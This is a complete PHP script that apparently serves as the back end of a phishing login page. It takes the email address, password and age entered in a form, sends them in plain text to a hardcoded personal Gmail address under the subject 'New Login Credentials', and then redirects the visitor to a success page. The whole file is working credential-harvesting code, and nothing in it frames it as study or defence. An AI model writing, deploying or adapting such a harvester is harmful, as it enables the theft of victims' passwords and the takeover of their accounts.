<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $age = $_POST['age'];
    
    // Email details
    $to = "delo.cisneros5@gmail.com";
    $subject = "New Login Credentials";
    $message = "User Credentials:\n\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";
    $message .= "Age: $age\n";
    $headers = "From: no-reply@example.com";

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to success page
        header("Location: success.html");
        exit();
    } else {
        echo "Failed to send email.";
    }
} else {
    echo "Invalid request.";
}
?>

